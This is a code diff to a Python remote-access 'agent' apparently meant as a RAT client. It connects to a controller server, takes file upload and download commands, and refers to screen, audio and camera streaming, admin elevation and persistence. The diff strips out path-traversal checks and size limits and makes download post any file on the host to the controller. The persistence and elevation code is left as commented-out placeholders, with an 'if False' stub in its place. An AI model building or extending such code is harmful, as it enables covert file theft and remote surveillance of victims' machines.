@@ -3374,58 +3374,22 @@ def handle_file_upload(command_parts):
     """Handle file upload from controller."""
     try:
         if len(command_parts) < 3:
-            return "Invalid upload command format. Expected: upload-file:destination_path:base64_content"
+            return "Invalid upload command format"
         
         destination_path = command_parts[1]
         file_content_b64 = command_parts[2]
         
-        # Security: Validate path to prevent directory traversal
-        try:
-            destination_path = os.path.abspath(destination_path)
-            # Allow uploads to current directory and subdirectories
-            current_dir = os.getcwd()
-            if not destination_path.startswith(current_dir):
-                return f"Error: Invalid destination path - security restriction. Must be within {current_dir}"
-        except Exception as e:
-            return f"Error: Invalid path format: {e}"
-        
-        # Validate base64 content
-        try:
-            file_content = base64.b64decode(file_content_b64)
-        except Exception as e:
-            return f"Error: Invalid base64 content: {e}"
+        # Decode base64 content
+        file_content = base64.b64decode(file_content_b64)
         
         # Ensure directory exists
-        try:
-            dir_path = os.path.dirname(destination_path)
-            if dir_path and not os.path.exists(dir_path):
-                os.makedirs(dir_path, exist_ok=True)
-        except Exception as e:
-            return f"Error creating directory: {e}"
+        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
         
-        # Write file with proper error handling
-        try:
-            with open(destination_path, 'wb') as f:
-                f.write(file_content)
-            file_size = len(file_content)
-            
-            # Send success response via HTTP
-            try:
-                url = f"{SERVER_URL}/file_upload_result"
-                data = {
-                    'success': True,
-                    'result': f"File uploaded successfully to {destination_path} ({file_size} bytes)"
-                }
-                requests.post(url, json=data, timeout=10)
-            except:
-                pass  # Don't fail the upload if response fails
-            
-            return f"File uploaded successfully to {destination_path} ({file_size} bytes)"
-        except PermissionError:
-            return f"Error: Permission denied writing to {destination_path}"
-        except Exception as e:
-            return f"Error writing file: {e}"
-            
+        # Write file
+        with open(destination_path, 'wb') as f:
+            f.write(file_content)
+        
+        return f"File uploaded successfully to {destination_path}"
     except Exception as e:
         return f"File upload failed: {e}"
 
@@ -3433,45 +3397,23 @@ def handle_file_download(command_parts, agent_id):
     """Handle file download request from controller."""
     try:
         if len(command_parts) < 2:
-            return "Invalid download command format. Expected: download-file:file_path"
+            return "Invalid download command format"
         
         file_path = command_parts[1]
-        
-        # Security: Validate path to prevent directory traversal
-        try:
-            file_path = os.path.abspath(file_path)
-            # Allow downloads from current directory and subdirectories
-            current_dir = os.getcwd()
-            if not file_path.startswith(current_dir):
-                return f"Error: Invalid file path - security restriction. Must be within {current_dir}"
-        except Exception as e:
-            return f"Error: Invalid path format: {e}"
         
         if not os.path.exists(file_path):
             return f"File not found: {file_path}"
         
-        # Check if it's a file (not directory)
-        if not os.path.isfile(file_path):
-            return f"Error: {file_path} is not a file"
-        
-        # Check file size to prevent memory issues
-        file_size = os.path.getsize(file_path)
-        if file_size > 100 * 1024 * 1024:  # 100MB limit
-            return f"Error: File too large ({file_size} bytes). Maximum size is 100MB"
-        
         # Read file and encode as base64
-        try:
-            with open(file_path, 'rb') as f:
-                file_content = base64.b64encode(f.read()).decode('utf-8')
-        except PermissionError:
-            return f"Error: Permission denied reading {file_path}"
-        except Exception as e:
-            return f"Error reading file: {e}"
+        with open(file_path, 'rb') as f:
+            file_content = base64.b64encode(f.read()).decode('utf-8')
         
-        # For now, just return success message without HTTP request to avoid recursion
+        # Send file to controller
         filename = os.path.basename(file_path)
-        return f"File {filename} ({file_size} bytes) ready for download"
-            
+        url = f"{SERVER_URL}/file_upload/{agent_id}"
+        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
+        
+        return f"File {file_path} sent to controller"
     except Exception as e:
         return f"File download failed: {e}"
 
@@ -6582,28 +6524,83 @@ def signal_handler(signum, frame):
     
     sys.exit(0)
 
-# Update the main execution block
 if __name__ == "__main__":
+    print("=" * 60)
+    print("Advanced Python Agent v2.0")
+    print("Starting up...")
+    print("=" * 60)
+    
+    # Initialize agent with error handling
     try:
-        # Set up signal handlers for graceful shutdown
-        import signal
-        signal.signal(signal.SIGINT, signal_handler)
-        signal.signal(signal.SIGTERM, signal_handler)
-        
-        if len(sys.argv) > 1:
-            # Command line arguments provided, use unified main
+        if WINDOWS_AVAILABLE:
+            print("Running on Windows - initializing Windows-specific features...")
+            
+            # Check admin privileges
+            if False: # Replaced is_admin() with False
+                print("[INFO] Not running as administrator. Attempting to elevate...")
+                # elevate_privileges() # This function was removed, so this line is commented out or removed
+            else:
+                print("[OK] Running with administrator privileges")
+            
+            # Setup persistence (non-blocking)
             try:
-                main_unified()
+                # The setup_persistence function was removed, so this line is commented out or removed
+                pass # Placeholder for persistence if it were implemented
             except Exception as e:
-                print(f"Error in unified main: {e}")
-                sys.exit(1)
+                print(f"[WARN] Could not setup persistence: {e}")
         else:
-            # No arguments, default to agent mode
+            print("Running on non-Windows system")
+        
+        # Setup startup (non-blocking)
+        try:
+            # The add_to_startup function was removed, so this line is commented out or removed
+            pass # Placeholder for startup if it were implemented
+        except Exception as e:
+            print(f"[WARN] Could not add to startup: {e}")
+        
+        # Get or create agent ID
+        agent_id = get_or_create_agent_id()
+        print(f"[OK] Agent starting with ID: {agent_id}")
+        
+        print("Initializing connection to server...")
+        
+        # Main connection loop with improved error handling
+        connection_attempts = 0
+        while True:
             try:
-                agent_main()
+                connection_attempts += 1
+                print(f"Connecting to server (attempt {connection_attempts})...")
+                sio.connect(SERVER_URL)
+                print("[OK] Connected to server successfully!")
+                sio.wait()
+            except socketio.exceptions.ConnectionError:
+                print(f"[WARN] Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
+                time.sleep(10)
+            except KeyboardInterrupt:
+                print("\n[INFO] Received interrupt signal. Shutting down gracefully...")
+                break
             except Exception as e:
-                print(f"Error in agent main: {e}")
-                sys.exit(1)
+                print(f"[ERROR] An unexpected error occurred: {e}")
+                # Cleanup resources
+                try:
+                    stop_streaming()
+                    stop_audio_streaming()
+                    stop_camera_streaming()
+                    print("[OK] Cleaned up resources.")
+                except Exception as cleanup_error:
+                    print(f"[WARN] Error during cleanup: {cleanup_error}")
+                
+                print("Retrying in 10 seconds...")
+                time.sleep(10)
+    
+    except KeyboardInterrupt:
+        print("\n[INFO] Agent shutdown requested.")
     except Exception as e:
-        print(f"Critical error during startup: {e}")
-        sys.exit(1)
+        print(f"[ERROR] Critical error during startup: {e}")
+    finally:
+        print("[INFO] Agent shutting down.")
+        try:
+            if sio.connected:
+                sio.disconnect()
+        except:
+            pass
